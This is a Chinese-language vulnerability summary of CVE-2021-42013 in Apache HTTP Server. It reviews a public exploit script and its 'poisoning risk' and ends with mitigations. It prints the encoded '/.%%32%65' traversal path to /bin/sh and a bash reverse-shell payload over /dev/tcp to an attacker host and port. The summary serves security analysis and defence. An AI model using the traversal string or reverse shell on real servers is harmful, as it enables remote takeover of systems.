## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache 版本，且允许 CGI 脚本执行，Alias-like directives配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是一个存在于 Apache HTTP Server 2.4.49 和 2.4.50 版本中的路径遍历和远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用该漏洞通过构造恶意的 URL，绕过 Alias-like 指令的限制，访问服务器上受限制的文件。如果目标服务器配置允许 CGI 脚本执行，攻击者可以通过路径遍历执行任意代码。 

**有效性：** 提供的 Python 脚本 `CVE-2021-42013.py` 看起来有效，因为它实现了漏洞的利用过程。

该脚本首先尝试测试目标是否易受攻击，然后利用该漏洞通过 curl 命令发送一个 reverse shell payload。它还在本地启动一个监听器来接收 shell 连接。脚本中使用了 `subprocess.check_output` 执行 curl 命令，并使用线程来同时运行漏洞利用和监听器。

**投毒风险：**

分析提供的代码，存在一些小的投毒风险:

1.  **硬编码的路径:** 脚本中使用了硬编码的 `/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh` 路径。虽然这是漏洞利用的一部分，但如果攻击者修改此路径，可能会导致脚本在非预期目标上执行。
2.  **Reverse Shell Payload:** 使用了 `bash -c '0<&124-;exec 124<>/dev/tcp/{lhost}/{lport};sh <&124 >&124 2>&124'` 作为反向 shell payload。这个 payload 相对常见，但如果攻击者修改此 payload，可能会执行恶意命令，例如下载并执行其他恶意软件。
3.  **User-Agent:**  使用了特定的User-Agent字符串，这可能被用于识别和阻止攻击。攻击者可能会修改 User-Agent 来绕过检测。
4.  **端口硬编码:** 监听端口硬编码为4444,如果目标网络存在端口过滤,或者其他服务占用了4444端口,可能会利用失败,攻击者可能修改端口来绕过防御.

**利用方式：**

1.  **路径遍历:** 攻击者构造包含 `/.%%32%65/.%%32%65` 序列的恶意 URL，绕过 Apache 的路径规范化，从而访问位于 Alias-like 指令配置目录之外的文件。
2.  **CGI 执行:** 如果目标服务器的 `/cgi-bin/` 目录配置为允许执行 CGI 脚本，攻击者可以通过路径遍历访问 `sh` 或其他 shell 解释器。
3.  **远程代码执行:** 攻击者通过构造特定的请求，利用 `sh` 解释器执行任意 shell 命令。通常，攻击者会执行反向 shell 命令，从而在攻击者控制的机器上获得 shell 访问权限。

**缓解措施：**

*   升级到不受漏洞影响的 Apache HTTP Server 版本 (>= 2.4.51)。
*   禁用 CGI 脚本执行，除非绝对必要。
*   配置 Alias-like 指令时，确保使用 `Require all denied` 或其他适当的访问控制，限制对配置目录之外的文件的访问。
*   使用 Web 应用防火墙 (WAF) 检测和阻止包含路径遍历序列的恶意请求。


**项目地址:** [K3ysTr0K3R/CVE-2021-42013-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2021-42013-EXPLOIT)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)